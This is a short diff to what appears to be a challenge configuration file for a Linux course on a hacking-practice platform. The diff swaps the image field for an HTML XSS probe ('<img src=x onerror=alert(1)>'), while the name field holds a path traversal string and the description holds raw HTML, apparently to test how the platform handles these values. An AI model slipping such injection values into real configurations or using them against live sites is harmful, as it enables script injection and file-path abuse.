@@ -1,6 +1,6 @@
 id: linux-luminarium
 name: ../../
-image: pwncollege/challenge-legacy:latest
+image: <img src=x onerror=alert(1)>
 
 description: |
   <a>Click me</a>
